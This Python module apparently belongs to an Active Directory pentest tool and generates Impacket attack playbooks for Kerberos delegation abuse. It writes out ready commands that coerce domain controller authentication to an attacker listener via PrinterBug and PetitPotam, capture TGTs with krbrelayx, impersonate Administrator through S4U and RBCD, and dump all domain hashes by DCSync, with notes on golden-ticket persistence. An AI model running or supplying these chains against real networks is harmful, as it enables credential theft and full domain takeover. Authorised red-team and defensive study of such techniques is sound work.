"""Impacket suite command templates for delegation abuse (Linux toolset)."""

from __future__ import annotations

from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from sharpgate.analyser.models import DelegationFinding


def unconstrained_coerce(finding: DelegationFinding) -> list[dict]:
    """Unconstrained delegation: coerce DC auth and capture TGT."""
    domain = finding.domain.lower()
    target = finding.samaccountname

    return [
        {
            "step": 1,
            "title": f"Start krbrelayx listener on {target}",
            "prereq": f"Compromised credentials or AES key of {target}",
            "command": (
                f"# Export the machine account's AES key:\n"
                f"krbrelayx.py -aesKey <{target}_AES256_KEY>"
            ),
            "notes": [
                f"Run this on or as {target} to capture incoming TGTs.",
                "Use --dc-ip to specify the DC if DNS is not configured.",
            ],
        },
        {
            "step": 2,
            "title": "Coerce DC authentication via PrinterBug (MS-RPRN)",
            "prereq": f"Valid domain credentials + network access to DC and {target}",
            "command": (
                f"printerbug.py '{domain}/USER:PASSWORD'@<DC-IP> <{target}-IP>"
            ),
            "notes": [
                "The DC will authenticate back to the unconstrained delegation host.",
                "The DC's TGT will be captured by krbrelayx.",
            ],
        },
        {
            "step": 3,
            "title": "Coerce DC authentication via PetitPotam (MS-EFSRPC)",
            "prereq": f"Network access to DC and {target}",
            "command": (
                f"PetitPotam.py -d {domain} -u 'USER' -p 'PASSWORD' "
                f"<{target}-IP> <DC-IP>"
            ),
            "notes": [
                "Alternative to PrinterBug if MS-RPRN is not available.",
                "May work without credentials on unpatched DCs.",
            ],
        },
        {
            "step": 4,
            "title": "Use captured DC TGT for DCSync",
            "prereq": "DC TGT captured from step 2 or 3",
            "command": (
                f"export KRB5CCNAME=<DC_TGT>.ccache\n"
                f"secretsdump.py -k -no-pass {domain}/<DC-HOSTNAME>$@<DC-IP> -just-dc-ntlm"
            ),
            "notes": [
                "Full domain compromise via DCSync with the DC's TGT.",
                "Extract KRBTGT hash for golden ticket persistence.",
            ],
        },
    ]


def unconstrained_coerce_user(finding: DelegationFinding) -> list[dict]:
    """Unconstrained delegation on a USER account: find host, secretsdump, krbrelayx."""
    domain = finding.domain.lower()
    target = finding.samaccountname

    return [
        {
            "step": 1,
            "title": f"Enumerate SPNs to find {target}'s service host",
            "command": (
                f"GetUserSPNs.py '{domain}/USER:PASSWORD' -dc-ip <DC-IP> "
                f"-target-domain {domain} -request-user {target}"
            ),
            "notes": [
                f"Identifies the hostname from {target}'s SPN.",
                "The SPN hostname is where the service runs.",
            ],
        },
        {
            "step": 2,
            "title": "Dump the service host to extract cached TGTs",
            "prereq": "Admin access to the service host (from SPN)",
            "command": (
                f"secretsdump.py '{domain}/ADMIN:PASSWORD'@<SERVICE-HOST-IP> "
                f"-dc-ip <DC-IP>"
            ),
            "notes": [
                "Extract credentials from the service host.",
                f"Obtain {target}'s key material for krbrelayx.",
            ],
        },
        {
            "step": 3,
            "title": f"Start krbrelayx with {target}'s key",
            "prereq": f"AES key or NTLM hash of {target}",
            "command": (
                f"krbrelayx.py -aesKey <{target}_AES256_KEY> --dc-ip <DC-IP>"
            ),
            "notes": [
                f"Listens using {target}'s key to decrypt incoming TGTs.",
                "Works because the user account has unconstrained delegation.",
            ],
        },
        {
            "step": 4,
            "title": "Coerce DC authentication",
            "prereq": "Valid domain credentials + network access to DC",
            "command": (
                f"printerbug.py '{domain}/USER:PASSWORD'@<DC-IP> <ATTACKER-IP>\n\n"
                f"# Alternative: PetitPotam\n"
                f"PetitPotam.py -d {domain} -u 'USER' -p 'PASSWORD' "
                f"<ATTACKER-IP> <DC-IP>"
            ),
            "notes": [
                "Coerce the DC to authenticate to your krbrelayx listener.",
                f"DNS must resolve {target}'s SPN hostname to your listener IP.",
                "Use dnstool.py to add/modify the DNS record if needed.",
            ],
        },
        {
            "step": 5,
            "title": "Use captured DC TGT for DCSync",
            "prereq": "DC TGT captured by krbrelayx",
            "command": (
                f"export KRB5CCNAME=<DC_TGT>.ccache\n"
                f"secretsdump.py -k -no-pass {domain}/<DC-HOSTNAME>$@<DC-IP> "
                f"-just-dc-ntlm"
            ),
            "notes": [
                "Full domain compromise via DCSync with the DC's TGT.",
            ],
        },
    ]


def constrained_t2a4d(finding: DelegationFinding) -> list[dict]:
    """Constrained delegation with protocol transition: S4U2Self + S4U2Proxy."""
    domain = finding.domain.lower()
    account = finding.samaccountname
    spn = finding.allowed_services[0].raw_spn if finding.allowed_services else "SERVICE/HOST"

    steps = [
        {
            "step": 1,
            "title": f"S4U attack: impersonate Administrator to {spn}",
            "prereq": f"Password or NTLM hash of {account}",
            "command": (
                f"getST.py -spn '{spn}' -impersonate Administrator "
                f"'{domain}/{account}:PASSWORD'"
            ),
            "notes": [
                "With T2A4D, no interaction from the impersonated user is needed.",
                "S4U2Self gets a forwardable ticket, S4U2Proxy forwards it.",
                "Use -hashes :NTHASH for pass-the-hash.",
                "Use -aesKey KEY for AES authentication.",
            ],
        },
        {
            "step": 2,
            "title": "Use the impersonation ticket",
            "prereq": "Service ticket from step 1",
            "command": (
                f"export KRB5CCNAME=Administrator@{spn.replace('/', '_')}"
                f"@{domain.upper()}.ccache\n"
                f"smbclient.py -k -no-pass Administrator@<TARGET-HOST>"
            ),
            "notes": [
                "The ticket grants access as Administrator to the target service.",
            ],
        },
    ]

    # Add alternative service name trick step
    if finding.allowed_services:
        svc = finding.allowed_services[0]
        if svc.service_type in ("HTTP", "CIFS", "HOST", "WSMAN"):
            alt_spn = f"CIFS/{svc.hostname}" if svc.service_type != "CIFS" else f"HTTP/{svc.hostname}"
            steps.append({
                "step": 3,
                "title": "Alternative service name trick",
                "command": (
                    f"getST.py -spn '{spn}' -altservice '{alt_spn.split('/')[0]}' "
                    f"-impersonate Administrator '{domain}/{account}:PASSWORD'"
                ),
                "notes": [
                    f"Rewrites the ticket to access {alt_spn} on the same host.",
                    "The ticket is encrypted with the target host's key, not the SPN's.",
                    "Works for any service running under the same machine account.",
                ],
            })

    # Add DCSync step if targeting DC
    steps.append({
        "step": len(steps) + 1,
        "title": "DCSync via LDAP (if target is a DC)",
        "prereq": "Ticket to a DC service (or use -altservice LDAP)",
        "command": (
            f"getST.py -spn '{spn}' -altservice 'LDAP' "
            f"-impersonate Administrator '{domain}/{account}:PASSWORD'\n"
            f"export KRB5CCNAME=Administrator@LDAP_<DC>@{domain.upper()}.ccache\n"
            f"secretsdump.py -k -no-pass {domain}/Administrator@<DC-IP>"
        ),
        "notes": [
            "Rewrite service to LDAP for DCSync access.",
            "Only works if the target host is a domain controller.",
        ],
    })

    return steps


def constrained_no_t2a4d(finding: DelegationFinding) -> list[dict]:
    """Constrained delegation without protocol transition: needs client TGT."""
    domain = finding.domain.lower()
    account = finding.samaccountname
    spn = finding.allowed_services[0].raw_spn if finding.allowed_services else "SERVICE/HOST"

    return [
        {
            "step": 1,
            "title": f"S4U2Proxy with additional ticket to {spn}",
            "prereq": (
                f"Hash of {account} + a valid forwardable TGT from a client"
            ),
            "command": (
                f"getST.py -spn '{spn}' -impersonate Administrator "
                f"-additional-ticket <CLIENT_TGT.ccache> "
                f"'{domain}/{account}:PASSWORD'"
            ),
            "notes": [
                "Without T2A4D, S4U2Self does NOT produce a forwardable ticket.",
                "You need a legitimate forwardable TGT (e.g. captured from an "
                "unconstrained delegation host).",
                "Use -hashes :NTHASH for pass-the-hash.",
            ],
        },
        {
            "step": 2,
            "title": "Use the impersonation ticket",
            "prereq": "Service ticket from step 1",
            "command": (
                f"export KRB5CCNAME=Administrator@{spn.replace('/', '_')}"
                f"@{domain.upper()}.ccache\n"
                f"smbclient.py -k -no-pass Administrator@<TARGET-HOST>"
            ),
        },
    ]


def rbcd_existing(finding: DelegationFinding) -> list[dict]:
    """RBCD existing configuration: S4U from allowed principal."""
    domain = finding.domain.lower()
    target = finding.samaccountname
    principal = (
        finding.rbcd_principals[0].samaccountname
        if finding.rbcd_principals
        else "ALLOWED_PRINCIPAL$"
    )

    return [
        {
            "step": 1,
            "title": f"S4U attack from {principal} to {target}",
            "prereq": f"Credentials or hash of {principal}",
            "command": (
                f"getST.py -spn 'CIFS/{target}' -impersonate Administrator "
                f"'{domain}/{principal}:PASSWORD'"
            ),
            "notes": [
                f"{principal} is configured in {target}'s RBCD attribute.",
                "RBCD S4U works even without an SPN on the allowed principal.",
                "Use -hashes :NTHASH for pass-the-hash.",
            ],
        },
        {
            "step": 2,
            "title": f"Access {target} as Administrator",
            "prereq": "Service ticket from step 1",
            "command": (
                f"export KRB5CCNAME=Administrator@CIFS_{target}"
                f"@{domain.upper()}.ccache\n"
                f"smbclient.py -k -no-pass Administrator@{target}"
            ),
        },
    ]


def rbcd_setup(finding: DelegationFinding) -> list[dict]:
    """RBCD setup attack: add machine account + set RBCD + S4U."""
    domain = finding.domain.lower()
    target = finding.samaccountname

    return [
        {
            "step": 1,
            "title": "Add a machine account",
            "prereq": "Valid domain credentials + MachineAccountQuota > 0",
            "command": (
                f"addcomputer.py -computer-name 'YOURPC$' -computer-pass 'Password1' "
                f"'{domain}/USER:PASSWORD'"
            ),
            "notes": [
                "Default MachineAccountQuota is 10.",
                "The new machine account will be used as the RBCD principal.",
            ],
        },
        {
            "step": 2,
            "title": f"Set RBCD on {target} to allow YOURPC$",
            "prereq": f"Write access to {target}'s msDS-AllowedToActOnBehalfOfOtherIdentity",
            "command": (
                f"rbcd.py -delegate-from 'YOURPC$' -delegate-to '{target}' "
                f"-action write '{domain}/USER:PASSWORD'"
            ),
            "notes": [
                "Requires GenericAll, GenericWrite, WriteDacl, or WriteProperty.",
                "Use -hashes :NTHASH for pass-the-hash.",
            ],
        },
        {
            "step": 3,
            "title": f"S4U attack from YOURPC$ to {target}",
            "command": (
                f"getST.py -spn 'CIFS/{target}' -impersonate Administrator "
                f"'{domain}/YOURPC$:Password1'"
            ),
        },
        {
            "step": 4,
            "title": f"Access {target} as Administrator",
            "command": (
                f"export KRB5CCNAME=Administrator@CIFS_{target}"
                f"@{domain.upper()}.ccache\n"
                f"smbclient.py -k -no-pass Administrator@{target}"
            ),
        },
        {
            "step": 5,
            "title": "Cleanup: remove RBCD entry",
            "command": (
                f"rbcd.py -delegate-from 'YOURPC$' -delegate-to '{target}' "
                f"-action remove '{domain}/USER:PASSWORD'"
            ),
            "notes": [
                "Always clean up after testing to avoid leaving backdoors.",
            ],
        },
    ]


def findDelegation_enum(finding: DelegationFinding) -> list[dict]:
    """General delegation enumeration with findDelegation.py."""
    domain = finding.domain.lower()

    return [
        {
            "step": 1,
            "title": f"Enumerate all delegation in {domain}",
            "command": (
                f"findDelegation.py '{domain}/USER:PASSWORD' -dc-ip <DC-IP>"
            ),
            "notes": [
                "Shows unconstrained, constrained, and RBCD delegation.",
            ],
        },
    ]


IMPACKET_COMMANDS = {
    "unconstrained_coerce": unconstrained_coerce,
    "unconstrained_coerce_user": unconstrained_coerce_user,
    "constrained_t2a4d": constrained_t2a4d,
    "constrained_no_t2a4d": constrained_no_t2a4d,
    "rbcd_existing": rbcd_existing,
    "rbcd_setup": rbcd_setup,
    "findDelegation_enum": findDelegation_enum,
}
